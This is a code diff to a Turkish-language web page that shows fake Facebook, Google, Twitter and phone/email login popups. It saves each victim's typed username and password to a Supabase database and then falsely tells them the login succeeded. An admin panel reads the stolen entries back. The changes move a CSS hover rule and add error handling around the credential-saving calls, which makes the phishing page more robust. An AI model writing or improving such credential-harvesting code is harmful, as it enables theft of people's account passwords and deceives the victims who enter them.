@@ -133,6 +133,11 @@
       left: 140%;
     }
     
+    button:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
+    }
+    
     button.facebook {
       background: linear-gradient(135deg, #3b5998, #2d4373);
       color: white;
@@ -151,11 +156,6 @@
     button.phone {
       background: linear-gradient(135deg, #f4b400, #e0a300);
       color: #222;
-    }
-    
-    button:hover {
-      transform: translateY(-5px);
-      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
     }
     
     .legal {
@@ -1022,10 +1022,15 @@
       const password = document.getElementById('facebookPassword').value;
       const loginTime = new Date().toLocaleString();
       
-      await saveLoginAttempt(email, password, 'Facebook', loginTime);
-      facebookPopup.style.display = 'none';
-      facebookForm.reset();
-      alert("Facebook ile giriş başarılı!");
+      try {
+        await saveLoginAttempt(email, password, 'Facebook', loginTime);
+        alert("Facebook ile giriş başarılı!");
+      } catch (error) {
+        alert("Giriş işlemi sırasında bir hata oluştu: " + error.message);
+      } finally {
+        facebookPopup.style.display = 'none';
+        facebookForm.reset();
+      }
     });
     
     googleForm.addEventListener('submit', async (e) => {
@@ -1036,10 +1041,15 @@
       const remember = document.getElementById('googleRemember').checked;
       const loginTime = new Date().toLocaleString();
       
-      await saveLoginAttempt(email, password, 'Google', loginTime);
-      googlePopup.style.display = 'none';
-      googleForm.reset();
-      alert("Google ile giriş başarılı!");
+      try {
+        await saveLoginAttempt(email, password, 'Google', loginTime);
+        alert("Google ile giriş başarılı!");
+      } catch (error) {
+        alert("Giriş işlemi sırasında bir hata oluştu: " + error.message);
+      } finally {
+        googlePopup.style.display = 'none';
+        googleForm.reset();
+      }
     });
     
     twitterForm.addEventListener('submit', async (e) => {
@@ -1049,10 +1059,15 @@
       const password = document.getElementById('twitterPassword').value;
       const loginTime = new Date().toLocaleString();
       
-      await saveLoginAttempt(username, password, 'Twitter', loginTime);
-      twitterPopup.style.display = 'none';
-      twitterForm.reset();
-      alert("Twitter ile giriş başarılı!");
+      try {
+        await saveLoginAttempt(username, password, 'Twitter', loginTime);
+        alert("Twitter ile giriş başarılı!");
+      } catch (error) {
+        alert("Giriş işlemi sırasında bir hata oluştu: " + error.message);
+      } finally {
+        twitterPopup.style.display = 'none';
+        twitterForm.reset();
+      }
     });
     
     phoneForm.addEventListener('submit', async (e) => {
@@ -1062,10 +1077,15 @@
       const password = document.getElementById('phonePassword').value;
       const loginTime = new Date().toLocaleString();
       
-      await saveLoginAttempt(email, password, 'Phone/Email', loginTime);
-      phonePopup.style.display = 'none';
-      phoneForm.reset();
-      alert("Telefon/e-posta ile giriş başarılı!");
+      try {
+        await saveLoginAttempt(email, password, 'Phone/Email', loginTime);
+        alert("Telefon/e-posta ile giriş başarılı!");
+      } catch (error) {
+        alert("Giriş işlemi sırasında bir hata oluştu: " + error.message);
+      } finally {
+        phonePopup.style.display = 'none';
+        phoneForm.reset();
+      }
     });
     
     // Giriş denemesini kaydetme fonksiyonu (Supabase'e kaydeder)
@@ -1090,6 +1110,7 @@
         console.error('Supabase kayıt hatası:', error);
         throw new Error('Veri kaydedilemedi');
       }
+      return true;
     }
     
     // Admin panelini güncelleme (Supabase'den veri çeker)
